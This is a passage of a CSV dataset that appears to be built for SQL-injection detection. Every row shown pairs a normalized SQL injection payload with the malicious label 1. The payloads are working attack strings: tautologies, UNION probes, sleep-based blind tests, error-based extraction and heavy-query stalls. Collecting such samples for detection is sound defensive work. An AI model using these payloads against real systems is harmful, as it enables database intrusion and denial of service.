row_index,payload_norm,label,sqli_type_hint
8850,-9562' or 8571 = 8571--,1,
8851,"1'+ ( select nvht where 9118 = 9118 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",1,
8852,"1%"" and ( 2850 = 6610 ) *6610 and ""%"" = """,1,
8853,-3982 ) ) or 6872 = 6872 and ( ( 6331 = 6331,1,
8854,"1%' ) union all select null,null,null,null,null,null--",1,
8855,1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 4574 = 4574,1,
8856,"1"" ) as jngl where 8384 = 8384 and 4580 = 1718--",1,
8857,"1 where 9072 = 9072 and elt ( 4249 = 4249,7259 ) --",1,
8858,"1%' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",1,
8859,1 ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 1073 = 1073,1,
8860,1'|| ( select 'rdqv' from dual where 1894 = 1894,1,
8861,-6202 ) ) or 7845 = 1962--,1,
8862,"1 where 4468 = 4468 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
8863,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%"" = """,1,
8864,"-2340%"" order by 1#",1,
8865,"1'|| ( select 'gtri' from dual where 7097 = 7097 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",1,
8866,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'mqoj' like 'mqoj,1,
8867,1 ) where 4992 = 4992,1,
8868,"-4093' ) ) union all select 5785,5785,5785#",1,
8869,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'ngxz' = 'ngxz",1,
8870,-8181' ) ) or 5926 = 3332#,1,
8871,1' ) as pghp where 9086 = 9086,1,
8872,"1%"" ) ) and ( 7817 = 4371 ) *4371 and ( ( ""%"" = """,1,
8873,"1, ( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4932 = 4932 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )",1,
8874,1 ) ) as eveb where 7567 = 7567,1,
8875,"1%"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
8876,"-3902' ) ) ) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",1,
8877,"1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'gfll' = 'gfll",1,
8878,"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'jhxh' = 'jhxh",1,
8879,"-9684"" order by 1#",1,
